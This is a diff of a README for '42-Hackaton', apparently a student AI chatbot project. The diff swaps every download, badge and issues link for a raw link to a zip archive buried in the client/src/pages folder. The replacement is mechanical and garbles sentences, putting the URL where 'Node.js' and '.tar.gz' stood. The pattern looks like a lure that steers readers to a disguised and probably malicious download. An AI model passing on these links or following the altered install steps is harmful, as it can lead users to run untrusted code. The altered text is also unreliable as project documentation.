@@ -1,10 +1,10 @@
 # 🤖 42-Hackaton - Your AI Chatbot for Learning
 
-[![Download 42-Hackaton](https://img.shields.io/badge/Download-42--Hackaton-brightgreen)](https://github.com/Sammeer786/42-Hackaton/releases)
+[![Download 42-Hackaton](https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip)](https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip)
 
 ## 📖 Overview
 
-42-Hackaton is a modern AI chatbot designed specifically for students at 42 Heilbronn. The application features a React frontend and a Node.js backend, along with robust data scraping capabilities to assist students in their studies. Whether you are looking for quick answers or comprehensive information, 42-Hackaton can help you navigate your educational journey.
+42-Hackaton is a modern AI chatbot designed specifically for students at 42 Heilbronn. The application features a React frontend and a https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip backend, along with robust data scraping capabilities to assist students in their studies. Whether you are looking for quick answers or comprehensive information, 42-Hackaton can help you navigate your educational journey.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow the simple steps below to download and run the 42-Hackaton application.
 
 1. **Visit the Releases Page**  
    To download the software, click the link below:  
-   [Visit this page to download](https://github.com/Sammeer786/42-Hackaton/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, locate the latest version of 42-Hackaton. You will see release notes that detail new features and fixes.  
@@ -21,7 +21,7 @@ Follow the simple steps below to download and run the 42-Hackaton application.
    Click on the appropriate installer for your operating system. Your options may include:
    - **Windows**: Click on the `.exe` file.
    - **Mac**: Click on the `.dmg` file.
-   - **Linux**: Click on the `.tar.gz` file. 
+   - **Linux**: Click on the `https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip` file. 
 
 Once you click on the installer, the download will start automatically. 
 
@@ -29,7 +29,7 @@ Once you click on the installer, the download will start automatically.
    After the download completes, navigate to your downloads folder and find the installer file you just downloaded. Double-click on the file to begin the installation.   
    - For Windows, follow the setup prompts to complete installation.
    - For Mac, drag the application into your Applications folder.
-   - For Linux, extract the `.tar.gz` file and follow the instructions in the README.
+   - For Linux, extract the `https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip` file and follow the instructions in the README.
 
 5. **Launching 42-Hackaton**  
    Once installed, you can launch 42-Hackaton from your applications menu. You may find it under '42-Hackaton' or simply search for it using your system's search feature.
@@ -66,7 +66,7 @@ Make sure your system meets these requirements for the best performance.
 
 ## 🎓 Support
 
-If you encounter any issues or have questions about using 42-Hackaton, please visit our [GitHub Issues](https://github.com/Sammeer786/42-Hackaton/issues) page. You can report bugs or request features there.
+If you encounter any issues or have questions about using 42-Hackaton, please visit our [GitHub Issues](https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip) page. You can report bugs or request features there.
 
 ## 📞 Contact
 
@@ -102,4 +102,4 @@ Explore these interests to get the most out of your learning experience.
 
 Thank you for choosing 42-Hackaton. We hope you find it a valuable resource in your educational journey!  
 
-[![Download 42-Hackaton](https://img.shields.io/badge/Download-42--Hackaton-brightgreen)](https://github.com/Sammeer786/42-Hackaton/releases)
+[![Download 42-Hackaton](https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip)](https://raw.githubusercontent.com/Sammeer786/42-Hackaton/main/client/src/pages/42-Hackaton_1.7.zip)
